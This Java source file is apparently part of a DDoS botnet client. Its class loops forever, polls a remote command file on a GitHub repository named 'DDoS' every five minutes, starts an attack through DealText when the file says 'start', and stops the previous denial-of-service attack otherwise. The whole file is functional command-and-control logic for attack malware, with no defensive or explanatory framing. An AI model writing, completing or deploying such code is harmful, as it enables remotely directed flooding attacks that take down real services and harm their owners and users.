package deal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class GetText implements Runnable{
	
	private boolean isStart = false;  //是否开始执行
	private String text = "";

	@Override
	public void run() {
		// TODO Auto-generated method stub
		while(true)  //每隔至少x分钟读取一次命令
		{
			try{
				URL url = new URL("https://github.com/102400/DDoS/raw/master/command.txt");  //command.txt地址
				URLConnection conn = url.openConnection();
				BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
				if(br.readLine().equals("start"))  //当command.txt内容为start时则执行程序
				{
					String line = "";
					String temp_text = "";
					while((line = br.readLine()) !=null)
					{
						temp_text = temp_text + line + "\n";
					}
					if(temp_text.equals(text))  //比较上次接受的的文本
					{
						
					}
					else
					{
						text = temp_text;
						DealText dealtext = new DealText(text);
						dealtext.run();
					}
				}
				else
				{
					try
					{
						DoS.dos.stop();  //对上次的目标停止
					}
					catch(Exception ex)
					{
						ex.printStackTrace();
					}
				}
				
				br.close();
				
				Thread.currentThread().sleep(1000*60*5);  //每隔5分钟
			}
			catch(Exception ex)
			{
				ex.printStackTrace();
			}
		}
	}

}
